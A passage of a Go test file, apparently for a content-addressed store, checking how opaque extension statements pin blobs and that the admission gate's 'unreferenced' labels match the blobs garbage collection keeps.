		t.Fatalf("external-only: %v", r.Labels)
	}
	// an opaque statement naming a digest pins it, and is not labelled as missing content
	named := []byte("named by an extension")
	opaque := w.sign("B", "x_extension", obj("payload", blobDigest(named)))
	rep = mustAdmit(t, "hub check", Package{Objects: []Object{w.object(opaque), blobObject(named)}}, MemHeld{}, nil, Options{})
	if r := wantAdmitted(t, rep, w.path(opaque)); !r.HasLabel(LabelUnknownKind) || r.HasLabel(LabelUnavailable) {
		t.Fatalf("opaque: %v", r.Labels)
	}
	if r := wantAdmitted(t, rep, BlobPath(blobDigest(named))); r.HasLabel(LabelUnreferenced) {
		t.Fatalf("blob named by an opaque statement: %v", r.Labels)
	}
	rep = mustAdmit(t, "hub check", Package{Objects: []Object{w.object(opaque)}}, MemHeld{}, nil, Options{})
	if r := wantAdmitted(t, rep, w.path(opaque)); r.HasLabel(LabelUnavailable) {
		t.Fatalf("opaque without its blob: %v", r.Labels)
	}
}

// TestGateAndGCAgree: one fixture set asked of both. The blobs the gate reports as referenced (not
// `unreferenced`) are exactly the blobs store gc keeps as referenced, across content, provenance, an anchors
// proof, an opaque statement and a blob nothing names (the control, which both release).
func TestGateAndGCAgree(t *testing.T) {
	w := newWorld(t)
	blobs := map[string][]byte{}
	b := func(n string) []byte { blobs[n] = []byte("agree " + n); return blobs[n] }
	w.authored("A", b("content"), "provenance", canon.Value(obj("workflow", blobDigest(b("workflow")), "inputs", []string{blobDigest(b("input"))})))
	w.sign("A", "anchors", obj("covered", strings.Repeat("ab", 32), "proof", blobDigest(b("proof")), "proof_format", "ots-detached-v1"))
	w.sign("B", "x_extension", obj("payload", blobDigest(b("opaque"))))
	b("orphan")

	var objs []Object
	for _, id := range sortedIDs(w.lines) {
		objs = append(objs, w.object(id))
	}
	for _, x := range blobs {
		objs = append(objs, blobObject(x))
	}
	rep := mustAdmit(t, "pull", Package{Objects: objs}, MemHeld{}, nil, Options{})
	gateRefs := map[string]bool{}
	for _, x := range blobs {
		r := wantAdmitted(t, rep, BlobPath(blobDigest(x)))
		gateRefs[blobDigest(x)] = !r.HasLabel(LabelUnreferenced)
	}

	s, err := store.Open(t.TempDir(), store.Options{NoSync: true})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := Commit(s, rep); err != nil {
		t.Fatal(err)
	}
	zero := time.Duration(0)
	plan, err := s.GC(store.GCConfig{PerRun: &zero}, false)
	if err != nil {
		t.Fatal(err)
	}
	gcRefs := map[string]bool{}
	for _, k := range plan.Kept {
		gcRefs[string(k.Digest)] = strings.Contains(k.Why, "referenced by")
	}
	for _, c := range plan.Candidates {
		gcRefs[string(c.Digest)] = false
	}
	for n, x := range blobs {
		d := blobDigest(x)
		g, ok := gcRefs[d]
		if !ok {
			t.Fatalf("gc does not list %s", n)
		}
		if g != gateRefs[d] {
			t.Fatalf("%s: gate referenced=%v, gc referenced=%v", n, gateRefs[d], g)
		}
		if want := n != "orphan"; g != want {
			t.Fatalf("%s: referenced=%v, want %v", n, g, want)
		}
	}
}
